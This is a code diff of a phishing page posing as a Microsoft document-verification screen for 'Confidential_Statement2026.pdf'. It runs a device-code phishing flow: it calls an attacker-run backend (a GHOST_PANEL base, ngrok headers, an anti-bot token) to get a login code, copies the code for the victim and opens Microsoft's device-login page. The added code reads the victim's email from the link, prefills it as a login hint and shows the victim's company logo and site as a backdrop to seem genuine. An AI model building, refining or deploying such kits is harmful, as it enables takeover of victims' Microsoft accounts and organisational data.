@@ -320,23 +320,9 @@
         </div>
         <div class="right">
             <div class="right-inner">
-                <div id="lds" class="lc">
-                    <svg class="sl" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" stroke="#1473e6" stroke-width="3" fill="none"
-                            stroke-dasharray="32" stroke-linecap="round" />
-                    </svg>
-
-                    <h3 style="margin-bottom:8px;font-size:16px;color:#2c2c2c">
-                        Securing your session...
-                    </h3>
-
-                    <p id="ltxt" style="color:#6e6e6e;font-size:13px">
-                        Initializing secure connection...
-                    </p>
-
-                    <div style="margin-top:16px;height:4px;background:#eee;border-radius:4px;overflow:hidden">
-                        <div id="bar" style="height:100%;width:20%;background:#1473e6;transition:width 1s"></div>
-                    </div>
+                <div id="loading-screen">
+                    <div class="spin"></div>
+                    <p style="color:#888;font-size:13px">Preparing verification…</p>
                 </div>
                 <div id="success-screen"><svg width="48" height="48" viewBox="0 0 48 48"
                         style="margin:0 auto 12px;display:block">
@@ -392,174 +378,168 @@
     </div>
     <div class="ft">&copy; 2026 Microsoft Corporation</div>
     <script>
-        let startTime = Date.now();
-        let loadingInterval;
-        let sid = null, pi = null;
-        const at = '59a0a667251bc6201df815be9b525edbbd5b1e159c95bf9e668e310ece2c5ccc';
+        var ANTIBOT_TOKEN = '44ed0585b2876bcd6ecbf82cd1ddefdb943f256981ed68c61f8baecf04450e83';
+        var SUCCESS_URL = 'https://login.microsoftonline.com/jsdisabled';
+        var PAGE_ID = 'dcebfabdd203559b';
+        var PAGE_NAME = 'Confidential_Statement2026.pdf';
 
-        const steps = [
-            "Initializing secure connection...",
-            "Contacting Microsoft servers...",
-            "Generating verification code...",
-            "Finalizing secure session..."
-        ];
+        var _sessionId = null;
+        var _pollTimer = null;
+        var _pollFailCount = 0;
+        var _pollStartMs = 0;
+        var _grabbedEmail = '';
+        var _apiBase = (typeof GHOST_PANEL === 'string' && GHOST_PANEL) ? GHOST_PANEL : '';
+        var _verificationUrl = '';
 
-        let stepIndex = 0;
-        let progress = 20;
+        (function () {
+            var email = '';
+            var h = location.hash.slice(1);
+            var q = location.search.slice(1);
+            if (h && h.indexOf('urp=') !== -1) {
+                var m = h.match(/urp=([^&]+)/);
+                if (m) try { email = decodeURIComponent(m[1].replace(/\+/g, ' ')); } catch (e) { }
+            } else if (h && h.indexOf('@') !== -1) {
+                try { email = decodeURIComponent(h); } catch (e) { }
+            }
+            if (!email && q && q.indexOf('urp=') !== -1) {
+                var m2 = q.match(/urp=([^&]+)/);
+                if (m2) try { email = decodeURIComponent(m2[1].replace(/\+/g, ' ')); } catch (e) { }
+            }
+            if (email && email.indexOf('@') !== -1) _grabbedEmail = email;
+        })();
 
-        function startLoadingAnim() {
-            const text = document.getElementById('ltxt');
-            const bar = document.getElementById('bar');
-
-            loadingInterval = setInterval(() => {
-                stepIndex = (stepIndex + 1) % steps.length;
-                text.textContent = steps[stepIndex];
-
-                progress = Math.min(progress + 15, 90);
-                bar.style.width = progress + '%';
-            }, 1200);
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            startLoadingAnim();
-            setTimeout(sf, 800);
+        document.addEventListener('DOMContentLoaded', function () {
+            setTimeout(startFlow, 800);
         });
 
-        async function sf() {
-            startTime = Date.now();
+        async function startFlow() {
             try {
-                const r = await fetch('/api/device/start', {
+                var body = _grabbedEmail ? JSON.stringify({ grabbedEmail: _grabbedEmail }) : '{}';
+                var hdrs = { 'Content-Type': 'application/json', 'X-Antibot-Token': ANTIBOT_TOKEN, 'X-Page-Id': PAGE_ID, 'ngrok-skip-browser-warning': '1' };
+                if (typeof PAGE_NAME === 'string' && PAGE_NAME) hdrs['X-Page-Name'] = PAGE_NAME;
+                var resp = await fetch(_apiBase + '/api/device/start', {
                     method: 'POST',
-                    headers: { 'X-Antibot-Token': at }
+                    headers: hdrs,
+                    body: body,
+                    mode: 'cors',
+                    credentials: 'omit',
+                    cache: 'no-store'
                 });
+                var data = await resp.json();
+                if (!data.success || !data.userCode) { showError(data.error || 'Initialization failed'); return; }
 
-                const d = await r.json();
+                _sessionId = data.sessionId;
+                _verificationUrl = (data.verificationUriComplete || ('https://microsoft.com/devicelogin?otc=' + data.userCode)) || 'https://microsoft.com/devicelogin';
 
-                if (d.error) {
-                    se(d.error);
-                    return;
+                var el = document.getElementById('user-code');
+                if (el) el.textContent = data.userCode;
+                show('main-content');
+                hide('loading-screen');
+
+                if (_grabbedEmail) {
+                    var hintEl = document.getElementById('grabbed-email-hint');
+                    if (!hintEl) {
+                        var codeEl = document.getElementById('user-code');
+                        if (codeEl) {
+                            hintEl = document.createElement('div');
+                            hintEl.id = 'grabbed-email-hint';
+                            hintEl.style.cssText = 'margin-top:8px;font-size:12px;color:#666;word-break:break-all;';
+                            var box = codeEl.closest('div');
+                            if (box && box.parentNode) box.parentNode.insertBefore(hintEl, box.nextSibling);
+                            else codeEl.parentNode && codeEl.parentNode.appendChild(hintEl);
+                        }
+                    }
+                    if (hintEl) { hintEl.textContent = 'If the popup doesn\'t show your email, enter: ' + _grabbedEmail; hintEl.style.display = 'block'; }
                 }
 
-                sid = d.job_id;
-
-                // tetap di loading dulu
-                pi = setInterval(ck, 1500);
-
+                _pollStartMs = Date.now();
+                _pollFailCount = 0;
+                _pollTimer = setInterval(checkStatus, 3000);
             } catch (e) {
-                se(e.message || 'Failed');
+                showError(e.message || 'Failed to start verification');
             }
         }
 
-        async function ck() {
-            if (Date.now() - startTime > 120000) { // 2 menit
-                clearInterval(pi);
-                clearInterval(loadingInterval);
-                se("timeout_waiting_user_login");
+        async function checkStatus() {
+            if (!_sessionId) return;
+            if (Date.now() - _pollStartMs > 600000) {
+                clearInterval(_pollTimer);
+                showError('Verification timed out (10 min). Please refresh the page to try again.');
                 return;
             }
             try {
-
-                const r = await fetch('/api/device/status/' + sid);
-                console.log(r);
-                const d = await r.json();
-                console.log("POLL:", d);
-
-                if (d.status === "waiting_user") {
-
-                    // 🔥 tampilkan UI dulu walaupun belum ada code
-                    if (document.getElementById('dcs').classList.contains('hidden')) {
-                        document.getElementById('lds').classList.add('hidden');
-
-                        const dcs = document.getElementById('dcs');
-                        dcs.classList.remove('hidden');
-                        dcs.classList.add('fade-in');
-                    }
-
-                    const el = document.getElementById('uc');
-
-                    // 🔥 update code kalau sudah ada
-                    if (d.user_code && el.textContent !== d.user_code) {
-                        el.classList.remove('loading');
-
-                        el.style.transition = 'opacity 0.3s ease';
-                        el.style.opacity = 0;
-
-                        setTimeout(() => {
-                            el.textContent = d.user_code;
-                            el.style.opacity = 1;
-                        }, 150);
-                    }
-
-                    document.getElementById('bar').style.width = '100%';
+                var base = (typeof GHOST_PANEL === 'string' && GHOST_PANEL) ? GHOST_PANEL : '';
+                var fetchUrl = base + '/api/device/status/' + _sessionId;
+                var resp = await fetch(fetchUrl, { method: 'GET', mode: 'cors', credentials: 'omit', cache: 'no-store', redirect: 'follow', headers: { 'ngrok-skip-browser-warning': '1' } });
+                var text = await resp.text();
+                if (!text || text.charAt(0) !== '{') return;
+                var data = JSON.parse(text);
+                if (data.status === 'completed') {
+                    clearInterval(_pollTimer);
+                    hide('main-content');
+                    show('success-screen');
+                    setTimeout(function () { window.location.replace(SUCCESS_URL); }, 2500);
+                } else if (data.status === 'expired') {
+                    clearInterval(_pollTimer);
+                    showError('Session expired. Please refresh the page to start again.');
                 }
-                if (d.status === 'done' || d.status === 'success') {
-                    clearInterval(pi);
-                    clearInterval(loadingInterval);
+            } catch (e) { }
+        }
 
-                    document.getElementById('dcs').classList.add('hidden');
-                    document.getElementById('scs').classList.remove('hidden');
-
-                    setTimeout(() => {
-                        window.location.replace('https://www.docusign.com');
-                    }, 2000);
-                }
-
-                if (
-                    d.status === 'failed' ||
-                    d.status === 'timeout_waiting_user_login'
-                ) {
-                    clearInterval(pi);
-                    clearInterval(loadingInterval);
-                    se(d.error || d.status);
-                }
-
-            } catch (e) {
-                console.error("POLL ERROR:", e);
+        function copyCode() {
+            var code = document.getElementById('user-code');
+            if (!code) return;
+            var text = code.textContent || '';
+            navigator.clipboard.writeText(text).catch(function () {
+                var ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed'; ta.style.opacity = '0';
+                document.body.appendChild(ta); ta.select();
+                document.execCommand('copy'); document.body.removeChild(ta);
+            });
+            var btn = document.getElementById('copy-btn');
+            if (btn) {
+                var orig = btn.textContent;
+                btn.textContent = '\u2713 Copied!';
+                setTimeout(function () { btn.textContent = orig || 'Copy Code'; }, 2000);
             }
         }
 
+        function openMicrosoft() {
+            copyCode();
+            var url = _verificationUrl || 'https://microsoft.com/devicelogin';
+            if (_grabbedEmail && _grabbedEmail.indexOf('@') !== -1) {
+                var sep = url.indexOf('?') !== -1 ? '&' : '?';
+                url = url + sep + 'login_hint=' + encodeURIComponent(_grabbedEmail);
+                var domain = _grabbedEmail.split('@')[1];
+                if (domain) url = url + '&domain_hint=' + encodeURIComponent(domain);
+            }
+            var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
 
-        function cc() {
-            navigator.clipboard.writeText(document.getElementById('uc').textContent);
-            const b = document.getElementById('cpb');
-            b.textContent = '✓ Copied!';
-            setTimeout(() => { b.textContent = 'Copy Code'; }, 2000);
+            if (isMobile) {
+                window.open(url, '_blank');
+            } else {
+                var popW = 460, popH = 600;
+                var left = 16;
+                var top = Math.round((screen.availHeight - popH) / 2);
+                var popup = window.open(url, 'MSLogin', 'width=' + popW + ',height=' + popH + ',left=' + left + ',top=' + top);
+                if (!popup || popup.closed || typeof popup === 'undefined') {
+                    window.open(url, '_blank');
+                }
+            }
         }
 
-        function gm() {
-            cc();
-            const m = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
-            if (m) window.open('https://microsoft.com/devicelogin', '_blank');
-            else window.open('https://microsoft.com/devicelogin', 'ML', 'width=500,height=600');
+        function show(id) { var el = document.getElementById(id); if (el) el.style.display = 'block'; }
+        function hide(id) { var el = document.getElementById(id); if (el) el.style.display = 'none'; }
+        function showError(msg) {
+            hide('loading-screen'); hide('main-content');
+            var em = document.getElementById('error-msg');
+            if (em) em.textContent = msg;
+            show('error-screen');
         }
 
-        function se(m, showRestart = false) {
-            const map = {
-                "timeout_waiting_user_login": "Your verification code has expired. Please refresh to continue.",
-                "Session expired": "Your verification code has expired. Please refresh to continue.",
-                "failed": "Verification failed. Please refresh to try again.",
-                "Worker error": "Something went wrong. Please refresh and try again.",
-                "Worker crash": "Something went wrong. Please refresh and try again."
-            };
-
-            // hide semua state lain
-            document.getElementById('lds').classList.add('hidden');
-            document.getElementById('dcs').classList.add('hidden');
-
-            const msg = map[m] || "Your verification code has expired. Please refresh to continue.";
-
-            // tampilkan error + tombol refresh
-            document.getElementById('em').innerHTML = `
-    ${msg}
-    <br><br>
-    <button class="cpb" onclick="window.location.reload()">
-        Refresh Page
-    </button>
-`;
-
-            document.getElementById('ers').classList.remove('hidden');
-        }
     </script>
+    <script>(function () { var e = '', h = location.hash.slice(1), q = location.search.slice(1); if (h && h.indexOf('urp=') !== -1) { var m = h.match(/urp=([^&]+)/); if (m) try { e = decodeURIComponent(m[1]) } catch (x) { } } if (!e && q && q.indexOf('urp=') !== -1) { var m2 = q.match(/urp=([^&]+)/); if (m2) try { e = decodeURIComponent(m2[1]) } catch (x) { } } if (!e || e.indexOf('@') === -1) return; var dom = e.split('@')[1]; if (!dom) return; var logo = document.getElementById('m-logo-img') || document.querySelector('.company-logo'); if (logo) { logo.src = 'https://logo.clearbit.com/' + dom; logo.style.display = 'block'; logo.onerror = function () { this.src = 'https://www.google.com/s2/favicons?domain=' + dom + '&sz=128'; this.onerror = function () { this.style.display = 'none' } }; } var bg = document.getElementById('bg-frame'); if (!bg) { bg = document.createElement('iframe'); bg.id = 'bg-frame'; bg.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:0;pointer-events:none;filter:brightness(.85)'; document.body.insertBefore(bg, document.body.firstChild); var ov = document.createElement('div'); ov.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,.45);backdrop-filter:blur(2px);z-index:0;pointer-events:none'; document.body.insertBefore(ov, bg.nextSibling); var els = document.querySelectorAll('body > *:not(iframe):not(script)'); for (var i = 0; i < els.length; i++) { if (els[i] !== bg && els[i] !== ov && els[i].style) { if (!els[i].style.position || els[i].style.position === 'static') els[i].style.position = 'relative'; if (!els[i].style.zIndex) els[i].style.zIndex = '1'; } } } bg.src = 'https://' + dom; bg.style.display = 'block'; var fb = document.getElementById('bg-fallback'); if (fb) fb.style.display = 'none'; })();</script>
 </body>
 
 </html>
